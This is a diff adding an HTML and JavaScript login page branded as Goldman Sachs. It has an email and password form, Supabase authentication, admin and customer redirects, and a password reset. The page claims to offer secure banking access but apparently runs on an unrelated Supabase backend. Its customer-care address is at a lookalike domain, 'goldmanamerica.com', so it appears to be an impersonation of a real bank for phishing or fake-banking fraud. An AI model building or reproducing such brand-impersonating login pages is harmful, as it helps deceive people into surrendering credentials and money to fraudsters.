@@ -1,0 +1,1539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Login | Goldman Sachs</title>
+
+    <!-- Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            --pink: #ff1493;
+            --pink-dark: #d60072;
+            --pink-soft: #fff0f7;
+            --pink-light: #ffe1ef;
+
+            --black: #0b0b0d;
+            --black-soft: #17171a;
+
+            --white: #ffffff;
+            --grey: #6d6d73;
+            --grey-dark: #333338;
+            --light: #f7f7f8;
+            --border: #e8e8eb;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: var(--white);
+            min-height: 100vh;
+            color: var(--black);
+        }
+
+        .page {
+            min-height: 100vh;
+            display: flex;
+        }
+
+        /* =========================================================
+           LEFT SIDE
+           ========================================================= */
+
+        .left-panel {
+            width: 50%;
+            background:
+                linear-gradient(
+                    145deg,
+                    #fff0f7 0%,
+                    #ffffff 55%,
+                    #ffe1ef 100%
+                );
+
+            color: var(--black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 60px;
+            position: relative;
+            overflow: hidden;
+
+            border-right: 1px solid var(--border);
+        }
+
+        .left-panel::before {
+            content: "";
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            background: rgba(255, 20, 147, 0.06);
+            top: -180px;
+            left: -150px;
+        }
+
+        .left-panel::after {
+            content: "";
+            position: absolute;
+            width: 420px;
+            height: 420px;
+            border-radius: 50%;
+            background: rgba(255, 20, 147, 0.05);
+            bottom: -180px;
+            right: -150px;
+        }
+
+        .left-content {
+            position: relative;
+            z-index: 2;
+            max-width: 500px;
+        }
+
+        /* =========================================================
+           BRAND
+           ========================================================= */
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+
+            font-family: Georgia, serif;
+            font-size: 30px;
+            font-weight: 700;
+
+            margin-bottom: 70px;
+        }
+
+        .brand-logo {
+            width: 46px;
+            height: 46px;
+            background: var(--black);
+            border-radius: 10px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            position: relative;
+            overflow: hidden;
+        }
+
+        .brand-logo span {
+            position: absolute;
+            bottom: 11px;
+            width: 4px;
+            background: var(--pink);
+            border-radius: 3px;
+        }
+
+        .brand-logo span:nth-child(1) {
+            height: 11px;
+            left: 12px;
+        }
+
+        .brand-logo span:nth-child(2) {
+            height: 18px;
+            left: 20px;
+        }
+
+        .brand-logo span:nth-child(3) {
+            height: 26px;
+            left: 28px;
+        }
+
+        .brand-name {
+            color: var(--black);
+        }
+
+        .brand-name span {
+            color: var(--pink);
+        }
+
+        /* =========================================================
+           LEFT CONTENT
+           ========================================================= */
+
+        .left-content h1 {
+            font-family: Georgia, serif;
+            font-size: 54px;
+            line-height: 1.08;
+            margin-bottom: 25px;
+            color: var(--black);
+        }
+
+        .left-content h1 span {
+            color: var(--pink);
+        }
+
+        .left-content p {
+            font-size: 17px;
+            line-height: 1.7;
+            color: var(--grey);
+            max-width: 440px;
+        }
+
+        .security-box {
+            margin-top: 45px;
+            padding: 20px;
+
+            border: 1px solid #f2c4dc;
+            background: rgba(255, 255, 255, 0.8);
+
+            border-radius: 14px;
+        }
+
+        .security-box strong {
+            display: block;
+            margin-bottom: 7px;
+            color: var(--black);
+        }
+
+        .security-box span {
+            font-size: 14px;
+            color: var(--grey);
+            line-height: 1.5;
+        }
+
+        .security-icon {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: var(--pink-soft);
+            color: var(--pink);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            font-weight: 800;
+        }
+
+        /* =========================================================
+           RIGHT SIDE
+           ========================================================= */
+
+        .right-panel {
+            width: 50%;
+            background: var(--white);
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            padding: 50px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 470px;
+        }
+
+        .mobile-brand {
+            display: none;
+        }
+
+        .login-container h2 {
+            font-family: Georgia, serif;
+            color: var(--black);
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .login-container h2::after {
+            content: "";
+            display: block;
+            width: 48px;
+            height: 4px;
+            background: var(--pink);
+            border-radius: 10px;
+            margin-top: 14px;
+        }
+
+        .subtitle {
+            color: var(--grey);
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.6;
+        }
+
+        /* =========================================================
+           FORM
+           ========================================================= */
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--black);
+        }
+
+        .input-wrap {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            height: 54px;
+
+            border: 1px solid #d9d9df;
+            border-radius: 8px;
+
+            padding: 0 16px;
+
+            font-size: 15px;
+            outline: none;
+
+            transition: 0.2s;
+            background: var(--white);
+            color: var(--black);
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        input:focus {
+            border-color: var(--pink);
+            box-shadow:
+                0 0 0 3px rgba(255, 20, 147, 0.09);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+
+            transform: translateY(-50%);
+
+            border: none;
+            background: transparent;
+
+            color: var(--pink-dark);
+
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .password-toggle:hover {
+            color: var(--pink);
+        }
+
+        /* =========================================================
+           OPTIONS
+           ========================================================= */
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+            margin: 8px 0 25px;
+            font-size: 14px;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+
+            color: var(--grey);
+            margin: 0;
+        }
+
+        .remember input {
+            width: 16px;
+            height: 16px;
+            accent-color: var(--pink);
+        }
+
+        .forgot {
+            color: var(--pink-dark);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .forgot:hover {
+            color: var(--pink);
+            text-decoration: underline;
+        }
+
+        /* =========================================================
+           LOGIN BUTTON
+           ========================================================= */
+
+        .login-btn {
+            width: 100%;
+            height: 55px;
+
+            border: none;
+            border-radius: 8px;
+
+            background: var(--pink);
+            color: var(--white);
+
+            font-size: 16px;
+            font-weight: 700;
+
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .login-btn:hover {
+            background: var(--pink-dark);
+            transform: translateY(-1px);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* =========================================================
+           MESSAGES
+           ========================================================= */
+
+        .message {
+            display: none;
+
+            margin-bottom: 20px;
+            padding: 13px 15px;
+
+            border-radius: 8px;
+
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .message.error {
+            display: block;
+            background: #fff0f0;
+            border: 1px solid #f0caca;
+            color: #a12626;
+        }
+
+        .message.success {
+            display: block;
+            background: #effaf1;
+            border: 1px solid #c6e7cb;
+            color: #26733a;
+        }
+
+        /* =========================================================
+           DIVIDER
+           ========================================================= */
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+
+            margin: 30px 0;
+
+            color: #999;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+
+            height: 1px;
+            background: #e5e5e5;
+
+            flex: 1;
+        }
+
+        /* =========================================================
+           SUPPORT
+           ========================================================= */
+
+        .support-text {
+            text-align: center;
+
+            color: var(--grey);
+
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .support-text a {
+            color: var(--pink-dark);
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .support-text a:hover {
+            color: var(--pink);
+            text-decoration: underline;
+        }
+
+        .support-options {
+            margin-top: 12px;
+
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .support-options a {
+            padding: 8px 13px;
+
+            border: 1px solid var(--border);
+            border-radius: 7px;
+
+            background: var(--white);
+
+            font-size: 12px;
+        }
+
+        .footer {
+            text-align: center;
+
+            margin-top: 35px;
+
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* =========================================================
+           LOADING
+           ========================================================= */
+
+        .spinner {
+            display: inline-block;
+
+            width: 17px;
+            height: 17px;
+
+            border: 2px solid rgba(255,255,255,0.35);
+            border-top-color: white;
+
+            border-radius: 50%;
+
+            animation: spin 0.7s linear infinite;
+
+            vertical-align: middle;
+            margin-right: 7px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* =========================================================
+           MOBILE
+           ========================================================= */
+
+        @media (max-width: 900px) {
+
+            .page {
+                display: block;
+            }
+
+            .left-panel {
+                display: none;
+            }
+
+            .right-panel {
+                width: 100%;
+                min-height: 100vh;
+                padding: 30px 22px;
+            }
+
+            .mobile-brand {
+                display: flex;
+                align-items: center;
+                gap: 11px;
+
+                font-family: Georgia, serif;
+                font-size: 28px;
+                font-weight: 700;
+
+                color: var(--black);
+
+                margin-bottom: 50px;
+            }
+
+            .mobile-brand .mobile-logo {
+                width: 40px;
+                height: 40px;
+
+                background: var(--black);
+                border-radius: 8px;
+
+                display: flex;
+                align-items: center;
+                justify-content: center;
+
+                position: relative;
+            }
+
+            .mobile-brand .mobile-logo span {
+                position: absolute;
+                bottom: 9px;
+
+                width: 3px;
+
+                background: var(--pink);
+                border-radius: 3px;
+            }
+
+            .mobile-brand .mobile-logo span:nth-child(1) {
+                height: 9px;
+                left: 11px;
+            }
+
+            .mobile-brand .mobile-logo span:nth-child(2) {
+                height: 15px;
+                left: 18px;
+            }
+
+            .mobile-brand .mobile-logo span:nth-child(3) {
+                height: 21px;
+                left: 25px;
+            }
+
+            .mobile-brand span:last-child {
+                color: var(--pink);
+            }
+
+            .login-container h2 {
+                font-size: 32px;
+            }
+        }
+
+        @media (max-width: 500px) {
+
+            .right-panel {
+                padding: 25px 18px;
+            }
+
+            .mobile-brand {
+                margin-bottom: 40px;
+            }
+
+            .options {
+                font-size: 13px;
+            }
+
+            .support-options {
+                flex-direction: column;
+            }
+
+            .support-options a {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <!-- =========================================================
+         LEFT PANEL
+         ========================================================= -->
+
+    <section class="left-panel">
+
+        <div class="left-content">
+
+            <div class="brand">
+
+                <div class="brand-logo">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+
+                <div class="brand-name">
+                    Goldman <span>Sachs</span>
+                </div>
+
+            </div>
+
+            <h1>
+                Welcome <span>back.</span>
+            </h1>
+
+            <p>
+                Sign in to securely access your account and manage
+                your banking information.
+            </p>
+
+            <div class="security-box">
+
+                <div class="security-icon">
+                    ✓
+                </div>
+
+                <strong>
+                    Secure banking access
+                </strong>
+
+                <span>
+                    Your account information is protected through
+                    secure authentication and account security measures.
+                </span>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <!-- =========================================================
+         RIGHT PANEL
+         ========================================================= -->
+
+    <section class="right-panel">
+
+        <div class="login-container">
+
+            <!-- MOBILE BRAND -->
+
+            <div class="mobile-brand">
+
+                <div class="mobile-logo">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+
+                <div>
+                    Goldman <span>Sachs</span>
+                </div>
+
+            </div>
+
+
+            <h2>
+                Sign in
+            </h2>
+
+
+            <p class="subtitle">
+                Enter your email and password to continue.
+            </p>
+
+
+            <div
+                id="message"
+                class="message">
+            </div>
+
+
+            <!-- =================================================
+                 LOGIN FORM
+                 ================================================= -->
+
+            <form id="loginForm">
+
+                <div class="form-group">
+
+                    <label for="email">
+                        Email address
+                    </label>
+
+                    <input
+                        type="email"
+                        id="email"
+                        placeholder="Enter your email"
+                        autocomplete="email"
+                        required
+                    >
+
+                </div>
+
+
+                <div class="form-group">
+
+                    <label for="password">
+                        Password
+                    </label>
+
+                    <div class="input-wrap">
+
+                        <input
+                            type="password"
+                            id="password"
+                            placeholder="Enter your password"
+                            autocomplete="current-password"
+                            required
+                        >
+
+                        <button
+                            type="button"
+                            class="password-toggle"
+                            id="togglePassword"
+                        >
+                            Show
+                        </button>
+
+                    </div>
+
+                </div>
+
+
+                <div class="options">
+
+                    <label class="remember">
+
+                        <input
+                            type="checkbox"
+                            id="remember"
+                        >
+
+                        <span>
+                            Remember me
+                        </span>
+
+                    </label>
+
+
+                    <a
+                        href="#"
+                        class="forgot"
+                        id="forgotPassword"
+                    >
+                        Forgot password?
+                    </a>
+
+                </div>
+
+
+                <button
+                    type="submit"
+                    class="login-btn"
+                    id="loginButton"
+                >
+                    Sign in
+                </button>
+
+            </form>
+
+
+            <div class="divider">
+                Secure login
+            </div>
+
+
+            <!-- =================================================
+                 CUSTOMER SUPPORT
+                 ================================================= -->
+
+            <div class="support-text">
+
+                Having trouble signing in?
+
+                <br>
+
+                <div class="support-options">
+
+                    <a href="mailto:nfo@goldmanamerica.com">
+                        Customer Care
+                    </a>
+
+                </div>
+
+            </div>
+
+
+            <div class="footer">
+                © 2026 Goldman Sachs
+            </div>
+
+        </div>
+
+    </section>
+
+</div>
+
+
+<script>
+
+    /* =========================================================
+       SUPABASE CONFIGURATION
+       ========================================================= */
+
+    const SUPABASE_URL =
+        "https://kjbqmvkwdnhcuwqfopbd.supabase.co";
+
+    const SUPABASE_PUBLISHABLE_KEY =
+        "sb_publishable_DROx4lcBTNV1DaBgttcwOw_CY1-0T6L";
+
+
+    /* =========================================================
+       CREATE SUPABASE CLIENT
+       ========================================================= */
+
+    const supabaseClient =
+        window.supabase.createClient(
+            SUPABASE_URL,
+            SUPABASE_PUBLISHABLE_KEY,
+            {
+                auth: {
+                    persistSession: true,
+                    autoRefreshToken: true,
+                    detectSessionInUrl: true
+                }
+            }
+        );
+
+
+    /* =========================================================
+       ELEMENTS
+       ========================================================= */
+
+    const loginForm =
+        document.getElementById("loginForm");
+
+    const emailInput =
+        document.getElementById("email");
+
+    const passwordInput =
+        document.getElementById("password");
+
+    const loginButton =
+        document.getElementById("loginButton");
+
+    const messageBox =
+        document.getElementById("message");
+
+    const togglePassword =
+        document.getElementById("togglePassword");
+
+    const forgotPassword =
+        document.getElementById("forgotPassword");
+
+    const rememberCheckbox =
+        document.getElementById("remember");
+
+
+    /* =========================================================
+       SHOW MESSAGE
+       ========================================================= */
+
+    function showMessage(text, type = "error") {
+
+        messageBox.textContent = text;
+
+        messageBox.className =
+            "message " + type;
+
+    }
+
+
+    function clearMessage() {
+
+        messageBox.textContent = "";
+
+        messageBox.className =
+            "message";
+
+    }
+
+
+    /* =========================================================
+       PASSWORD SHOW / HIDE
+       ========================================================= */
+
+    togglePassword.addEventListener("click", function () {
+
+        if (passwordInput.type === "password") {
+
+            passwordInput.type = "text";
+
+            togglePassword.textContent = "Hide";
+
+        } else {
+
+            passwordInput.type = "password";
+
+            togglePassword.textContent = "Show";
+
+        }
+
+    });
+
+
+    /* =========================================================
+       REMEMBER EMAIL
+       ========================================================= */
+
+    const savedEmail =
+        localStorage.getItem("goldman_login_email");
+
+    if (savedEmail) {
+
+        emailInput.value = savedEmail;
+
+        rememberCheckbox.checked = true;
+
+    }
+
+
+    /* =========================================================
+       ROUTE USER AFTER SUCCESSFUL LOGIN
+       
+       IMPORTANT:
+       This function is ONLY called after a successful
+       sign-in. Opening login.html will NOT call it.
+       ========================================================= */
+
+    async function routeUser(user) {
+
+        try {
+
+            /* =====================================================
+               CHECK ADMIN PROFILE
+               ===================================================== */
+
+            const {
+                data: profile,
+                error: profileError
+            } =
+            await supabaseClient
+                .from("profiles")
+                .select("full_name, role")
+                .eq("id", user.id)
+                .maybeSingle();
+
+
+            if (
+                !profileError &&
+                profile &&
+                profile.role === "admin"
+            ) {
+
+                window.location.href =
+                    "admin.html";
+
+                return;
+
+            }
+
+
+            /* =====================================================
+               CHECK CUSTOMER ACCOUNT
+               ===================================================== */
+
+            const {
+                data: customer,
+                error: customerError
+            } =
+            await supabaseClient
+                .from("customers")
+                .select(
+                    "id, full_name, email, account_status"
+                )
+                .eq("user_id", user.id)
+                .maybeSingle();
+
+
+            if (customerError) {
+
+                console.error(
+                    "Customer lookup error:",
+                    customerError
+                );
+
+                showMessage(
+                    "We could not verify your account. Please try again."
+                );
+
+                await supabaseClient.auth.signOut();
+
+                return;
+
+            }
+
+
+            if (!customer) {
+
+                showMessage(
+                    "Your login is valid, but no customer account is linked to it. Please contact Customer Care."
+                );
+
+                await supabaseClient.auth.signOut();
+
+                return;
+
+            }
+
+
+            /* =====================================================
+               ACCOUNT STATUS
+               ===================================================== */
+
+            const status =
+                String(
+                    customer.account_status ||
+                    "Active"
+                ).toLowerCase();
+
+
+            if (status === "blocked") {
+
+                await supabaseClient.auth.signOut();
+
+                showMessage(
+                    "This account has been blocked. Please contact Customer Care."
+                );
+
+                return;
+
+            }
+
+
+            if (status === "closed") {
+
+                await supabaseClient.auth.signOut();
+
+                showMessage(
+                    "This account is closed and cannot be accessed."
+                );
+
+                return;
+
+            }
+
+
+            if (status === "pending") {
+
+                await supabaseClient.auth.signOut();
+
+                showMessage(
+                    "Your account is currently pending activation. Please contact Customer Care."
+                );
+
+                return;
+
+            }
+
+
+           // =====================================================
+// ACTIVE CUSTOMER
+// SEND LOGIN NOTIFICATION
+// =====================================================
+
+try {
+
+    const loginTime = new Date().toLocaleString(
+        "en-US",
+        {
+            dateStyle: "full",
+            timeStyle: "long"
+        }
+    );
+
+    const { error: emailError } =
+        await supabaseClient.functions.invoke(
+            "send-login-alert",
+            {
+                body: {
+                    email: user.email,
+                    fullName:
+                        customer.full_name ||
+                        "Customer",
+                    loginTime: loginTime
+                }
+            }
+        );
+
+    if (emailError) {
+
+        console.error(
+            "Login notification error:",
+            emailError
+        );
+
+        // The login itself remains successful
+        // even if the notification email fails.
+    }
+
+} catch (emailError) {
+
+    console.error(
+        "Login notification failed:",
+        emailError
+    );
+
+}
+
+
+// =====================================================
+// REDIRECT CUSTOMER
+// =====================================================
+
+window.location.href =
+    "dashboard.html";
+
+        } catch (error) {
+
+            console.error(
+                "Routing error:",
+                error
+            );
+
+            showMessage(
+                "Unable to verify your account. Please try again."
+            );
+
+        }
+
+    }
+
+
+    /* =========================================================
+       LOGIN
+       ========================================================= */
+
+    loginForm.addEventListener(
+        "submit",
+        async function (event) {
+
+            event.preventDefault();
+
+            clearMessage();
+
+
+            const email =
+                emailInput.value.trim();
+
+            const password =
+                passwordInput.value;
+
+
+            if (!email || !password) {
+
+                showMessage(
+                    "Please enter your email address and password."
+                );
+
+                return;
+
+            }
+
+
+            loginButton.disabled = true;
+
+            loginButton.innerHTML =
+                '<span class="spinner"></span>Signing in...';
+
+
+            try {
+
+                /* =================================================
+                   REMEMBER EMAIL
+
+                   The password is NEVER stored.
+                   ================================================= */
+
+                if (rememberCheckbox.checked) {
+
+                    localStorage.setItem(
+                        "goldman_login_email",
+                        email
+                    );
+
+                } else {
+
+                    localStorage.removeItem(
+                        "goldman_login_email"
+                    );
+
+                }
+
+
+                /* =================================================
+                   AUTHENTICATE WITH SUPABASE
+                   ================================================= */
+
+                const {
+                    data,
+                    error
+                } =
+                await supabaseClient.auth.signInWithPassword({
+                    email: email,
+                    password: password
+                });
+
+
+                if (error) {
+
+                    console.error(
+                        "Supabase login error:",
+                        error
+                    );
+
+
+                    const errorMessage =
+                        String(
+                            error.message || ""
+                        ).toLowerCase();
+
+
+                    if (
+                        errorMessage.includes(
+                            "invalid login credentials"
+                        )
+                    ) {
+
+                        showMessage(
+                            "Incorrect email or password. Please check your details and try again."
+                        );
+
+                    } else if (
+                        errorMessage.includes(
+                            "email not confirmed"
+                        )
+                    ) {
+
+                        showMessage(
+                            "Your email address has not been confirmed yet. Please contact Customer Care."
+                        );
+
+                    } else if (
+                        errorMessage.includes(
+                            "too many requests"
+                        )
+                    ) {
+
+                        showMessage(
+                            "Too many login attempts. Please wait a few minutes and try again."
+                        );
+
+                    } else {
+
+                        showMessage(
+                            error.message ||
+                            "Unable to sign in. Please try again."
+                        );
+
+                    }
+
+                    return;
+
+                }
+
+
+                if (
+                    !data ||
+                    !data.user
+                ) {
+
+                    showMessage(
+                        "Login was not completed. Please try again."
+                    );
+
+                    return;
+
+                }
+
+
+                /* =================================================
+                   CHECK ADMIN/CUSTOMER AND REDIRECT
+                   ================================================= */
+
+                await routeUser(
+                    data.user
+                );
+
+            } catch (error) {
+
+                console.error(
+                    "Login error:",
+                    error
+                );
+
+                showMessage(
+                    "Unable to connect to the secure login service. Please check your internet connection and try again."
+                );
+
+            } finally {
+
+                loginButton.disabled = false;
+
+                loginButton.textContent =
+                    "Sign in";
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       FORGOT PASSWORD
+       ========================================================= */
+
+    forgotPassword.addEventListener(
+        "click",
+        async function (event) {
+
+            event.preventDefault();
+
+            clearMessage();
+
+
+            const email =
+                emailInput.value.trim();
+
+
+            if (!email) {
+
+                showMessage(
+                    "Enter your email address first, then select Forgot password."
+                );
+
+                emailInput.focus();
+
+                return;
+
+            }
+
+
+            try {
+
+                forgotPassword.style.pointerEvents =
+                    "none";
+
+                forgotPassword.textContent =
+                    "Sending...";
+
+
+                const {
+                    error
+                } =
+                await supabaseClient.auth
+                    .resetPasswordForEmail(
+                        email,
+                        {
+                            redirectTo:
+                                window.location.origin +
+                                "/reset-password.html"
+                        }
+                    );
+
+
+                if (error) {
+
+                    console.error(
+                        "Password reset error:",
+                        error
+                    );
+
+                    showMessage(
+                        error.message ||
+                        "Unable to send the password reset email."
+                    );
+
+                    return;
+
+                }
+
+
+                showMessage(
+                    "If an account exists for this email address, a password reset link has been sent.",
+                    "success"
+                );
+
+            } catch (error) {
+
+                console.error(
+                    "Password recovery error:",
+                    error
+                );
+
+                showMessage(
+                    "Unable to send the password reset request. Please try again."
+                );
+
+            } finally {
+
+                forgotPassword.style.pointerEvents =
+                    "";
+
+                forgotPassword.textContent =
+                    "Forgot password?";
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       AUTH STATE LISTENER
+       
+       We intentionally DO NOT redirect here.
+       
+       This prevents login.html from automatically opening
+       admin.html/dashboard.html just because an old session
+       exists in the browser.
+       ========================================================= */
+
+    supabaseClient.auth.onAuthStateChange(
+        function (event, session) {
+
+            if (event === "SIGNED_OUT") {
+
+                console.log(
+                    "User signed out."
+                );
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       IMPORTANT
+       
+       There is NO checkExistingSession() call here.
+       
+       Therefore:
+       
+       Opening login.html
+       ↓
+       Login page stays open
+       
+       User enters credentials
+       ↓
+       Clicks Sign in
+       ↓
+       Supabase authenticates
+       ↓
+       Admin → admin.html
+       Customer → dashboard.html
+       
+       ========================================================= */
+
+</script>
+
+</body>
+</html>
